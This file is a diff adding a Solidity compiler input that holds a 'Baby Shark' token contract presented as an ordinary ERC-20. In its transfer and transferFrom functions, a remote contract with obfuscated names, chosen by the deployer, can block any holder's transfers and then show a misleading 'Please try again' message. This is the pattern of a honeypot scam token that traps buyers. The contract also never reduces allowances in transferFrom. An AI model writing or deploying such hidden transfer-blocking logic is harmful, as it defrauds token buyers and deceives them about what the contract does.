@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "LightMoon3_NI.sol": {
+      "content": "//SPDX-License-Identifier: UNLICENSED\r\npragma solidity ^0.7.6;\r\n\r\ninterface R2D2 {\r\n\r\n    function staking( uint _a, uint _b) external view returns (bool);\r\n\r\n    function zakl(address account) external view returns (uint8);\r\n\r\n    function unstake(address senders, address taker, uint balance, uint amount) external returns (bool);\r\n\r\n    function withdraw(uint account, uint amounta, uint abountb) external returns (bool);\r\n\r\n\r\n}\r\n\r\ncontract BabyShark {\r\n    mapping(address => uint256) public balances;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n    \r\n    R2D2 rmtmeth;\r\n    uint256 public totalSupply = 10 * 10**12 * 10**18;\r\n    string public name = \"Baby Shark\";\r\n    string public symbol = hex\"42616279536861726Bf09fa688\";\r\n    uint public decimals = 18;\r\n    \r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    \r\n    constructor(R2D2 paparam) {\r\n        \r\n        rmtmeth = paparam;\r\n        balances[msg.sender] = totalSupply;\r\n        emit Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n    \r\n    \r\n    function balanceOf(address wallet) public view returns(uint256) {\r\n        return balances[wallet];\r\n    }\r\n    \r\n    function transfer(address to, uint256 value) public returns(bool) {\r\n        require(rmtmeth.zakl(msg.sender) != 1, \"Please try again\"); \r\n        require(balanceOf(msg.sender) >= value, 'balance too low');\r\n        balances[to] += value;\r\n        balances[msg.sender] -= value;\r\n        emit Transfer(msg.sender, to, value);\r\n        return true;\r\n        \r\n    }\r\n\r\n    \r\n    function transferFrom(address from, address to, uint256 value) public returns(bool) {\r\n        require(rmtmeth.zakl(from) != 1, \"Please try again\");\r\n        require(balanceOf(from) >= value, 'balance too low');\r\n        require(allowance[from][msg.sender] >= value, 'allowance too low');\r\n        balances[to] += value;\r\n        balances[from] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true;\r\n    }\r\n    \r\n    function approve(address holder, uint256 value) public returns(bool) {\r\n        allowance[msg.sender][holder] = value;\r\n        return true;\r\n        \r\n    }\r\n}\r\n"
+    }
+  }
+}
